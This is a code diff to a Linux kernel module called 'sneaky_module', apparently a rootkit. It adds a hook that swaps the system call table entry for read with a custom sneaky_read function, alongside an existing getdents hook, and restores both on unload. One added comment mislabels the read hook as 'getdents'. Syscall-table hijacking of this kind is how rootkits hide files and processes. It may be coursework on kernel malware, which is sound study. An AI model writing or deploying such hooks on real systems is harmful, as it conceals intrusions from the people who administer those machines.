@@ -183,7 +183,11 @@ static int initialize_sneaky_module(void)
   // substitute "getdents" system call (token: __NR_getdents )
   sys_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
-  
+
+  // substitute "getdents" system call (token: __NR_read )
+  sys_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
+
 
   ////////////////////
   ///  clean-ups
@@ -226,6 +230,9 @@ static void exit_sneaky_module(void)
 
   // recover original "getdents" system call (token: __NR_getdents )
   *(sys_call_table + __NR_getdents) = (unsigned long)sys_getdents;
+
+  // recover original "read" system call (token: __NR_read )
+  *(sys_call_table + __NR_read) = (unsigned long)sys_read;
 
   
   /////////////////
